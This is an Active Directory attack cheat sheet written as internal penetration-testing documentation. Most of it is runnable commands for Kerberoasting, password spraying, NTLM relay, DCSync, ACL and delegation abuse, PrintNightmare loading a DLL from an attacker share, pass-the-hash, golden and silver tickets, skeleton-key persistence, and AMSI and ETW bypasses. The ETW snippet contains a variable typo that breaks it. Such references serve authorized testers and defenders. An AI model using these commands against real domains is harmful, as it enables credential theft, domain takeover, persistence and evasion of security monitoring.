# Active Directory Attacks

Active Directory (AD) is a critical component of enterprise Windows environments and a primary target for attackers seeking domain-wide access during authorized penetration testing engagements.

---

## AD Attack Framework

```
    ACTIVE DIRECTORY ATTACK PATH

    [Initial Foothold]
           |
           v
    [AD Enumeration]
           |
           v
    [Credential Access]
           |
           v
    [Privilege Escalation]
           |
           v
    [Lateral Movement]
           |
           v
    [Domain Dominance]
```

---

## AD Enumeration

### Domain Enumeration

```bash
# PowerView
Get-Domain
Get-DomainController
Get-DomainPolicy

# BloodHound collection
SharpHound.exe -c All
bloodhound-python -u user -p password -d domain.com -dc dc01.domain.com

# Native commands
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
nltest /dclist:domain.com
```

### User Enumeration

```bash
# PowerView
Get-DomainUser
Get-DomainUser -SPN  # Kerberoastable
Get-DomainUser -PreauthNotRequired  # AS-REP roastable

# LDAP queries
ldapsearch -H ldap://DC -x -b "DC=domain,DC=com" "(objectClass=user)"

# Net commands
net user /domain
net user administrator /domain
```

### Group Enumeration

```bash
# PowerView
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
Get-DomainGroup -AdminCount

# Nested groups
Get-DomainGroup -MemberIdentity username

# Net commands
net group /domain
net localgroup administrators
```

### Computer Enumeration

```bash
# PowerView
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainComputer -Unconstrained

# Find Domain Controllers
Get-DomainController
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
```

### ACL Enumeration

```bash
# PowerView
Find-InterestingDomainAcl
Get-DomainObjectAcl -Identity "Domain Admins"
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# BloodHound queries
MATCH (u:User)-[r:GenericAll]->(g:Group) RETURN u,r,g
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.COM"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p
```

---

## Credential Attacks

### Kerberoasting

```bash
# Request TGS for SPNs
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# PowerView + Mimikatz
Get-DomainUser -SPN | Get-DomainSPNTicket

# Crack hashes
hashcat -m 13100 hashes.txt rockyou.txt
john --format=krb5tgs hashes.txt
```

### AS-REP Roasting

```bash
# Find vulnerable users
Get-DomainUser -PreauthNotRequired

# Request AS-REP
GetNPUsers.py domain/ -usersfile users.txt -format hashcat

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Crack hashes
hashcat -m 18200 hashes.txt rockyou.txt
```

### Password Spraying

```bash
# CrackMapExec
crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success

# Kerbrute
kerbrute passwordspray -d domain.com users.txt 'Password123'

# Spray with account lockout awareness
spray.py -h smb://DC_IP -u users.txt -p passwords.txt -l 5 -t 30
```

### LLMNR/NBT-NS Poisoning

```bash
# Responder
responder -I eth0 -rdwv

# Capture NTLMv2 hashes
# Then crack or relay

# Relay to target
ntlmrelayx.py -t smb://TARGET -smb2support
```

---

## Privilege Escalation

### DCSync Attack

```bash
# Requires replication rights (DA, DC, or specific ACL)
# Mimikatz
lsadump::dcsync /user:Administrator /domain:domain.com
lsadump::dcsync /all /csv

# Impacket
secretsdump.py domain/user:password@DC_IP
secretsdump.py -hashes :NTHASH domain/user@DC_IP
```

### ACL Abuse

```bash
# GenericAll on user - reset password
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll on group - add member
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# WriteDACL - grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity attacker -Rights DCSync

# WriteOwner - take ownership
Set-DomainObjectOwner -Identity target -OwnerIdentity attacker
```

### Delegation Attacks

```bash
# Unconstrained Delegation
# Find computers
Get-DomainComputer -Unconstrained

# Wait for admin to connect, extract TGT
Rubeus.exe monitor /interval:5

# Constrained Delegation
# Find accounts
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Request ticket for impersonation
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt

# Resource-Based Constrained Delegation (RBCD)
# If you have write access to msDS-AllowedToActOnBehalfOfOtherIdentity
Set-ADComputer -Identity target -PrincipalsAllowedToDelegateToAccount attacker$
```

### Print Spooler Attacks

```bash
# PrintNightmare (CVE-2021-1675)
# Add local admin
Invoke-Nightmare -NewUser "attacker" -NewPassword "Password123!"

# Remote execution
python3 CVE-2021-1675.py domain/user:password@TARGET '\\ATTACKER\share\evil.dll'

# Coercion for relay
printerbug.py domain/user:password@TARGET ATTACKER
```

---

## Lateral Movement

### Pass-the-Hash

```bash
# Impacket
psexec.py -hashes :NTHASH domain/user@TARGET
wmiexec.py -hashes :NTHASH domain/user@TARGET
smbexec.py -hashes :NTHASH domain/user@TARGET

# CrackMapExec
crackmapexec smb TARGET -u user -H NTHASH -x "whoami"

# Mimikatz
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /run:cmd.exe
```

### Pass-the-Ticket

```bash
# Export ticket
Rubeus.exe dump /luid:0x123456 /service:krbtgt

# Import ticket
Rubeus.exe ptt /ticket:base64_ticket

# Mimikatz
kerberos::ptt ticket.kirbi

# Use ticket
dir \\TARGET\c$
```

### Overpass-the-Hash

```bash
# Request TGT with hash
Rubeus.exe asktgt /user:Administrator /rc4:HASH /ptt

# Mimikatz
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /run:powershell.exe
```

---

## Domain Dominance

### Golden Ticket

```bash
# Need KRBTGT hash from DCSync
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.com Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.com/Administrator@DC
```

### Silver Ticket

```bash
# Need service account hash
# For CIFS access
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /target:TARGET.domain.com /service:cifs /rc4:SERVICE_HASH /ptt

# For MSSQL
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /target:SQL.domain.com /service:MSSQLSvc /rc4:SERVICE_HASH /ptt
```

### Skeleton Key

```bash
# Inject into LSASS on DC
# Allows any user to authenticate with "mimikatz" password
misc::skeleton

# Now login as any user with password "mimikatz"
```

### AdminSDHolder Persistence

```bash
# Add user to AdminSDHolder ACL
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity attacker -Rights All

# Wait 60 minutes for SDProp to run
# Or trigger manually
Invoke-SDPropagator -timeoutMinutes 1 -showProgress
```

---

## Defense Evasion

### AMSI Bypass

```powershell
# PowerShell AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### ETW Bypass

```powershell
# Patch ETW
$Ession = [Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
$Session.SetValue([Diagnostics.Eventing.EventProvider]::new([guid]::NewGuid()),$false)
```

---

## BloodHound Queries

```cypher
# Shortest path to Domain Admins
MATCH (u:User {name:"USER@DOMAIN.COM"}),(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}),p=shortestPath((u)-[*1..]->(g)) RETURN p

# Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name

# Unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# Users with DCSync rights
MATCH (u)-[:GetChanges]->(d:Domain),(u)-[:GetChangesAll]->(d) RETURN u.name

# All admin users
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name,c.name
```

---

## References

- SpecterOps BloodHound Documentation
- HarmJ0y PowerView
- Mimikatz Wiki
- Active Directory Security Blog

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2024-01-15 | Security Architecture | Initial release |
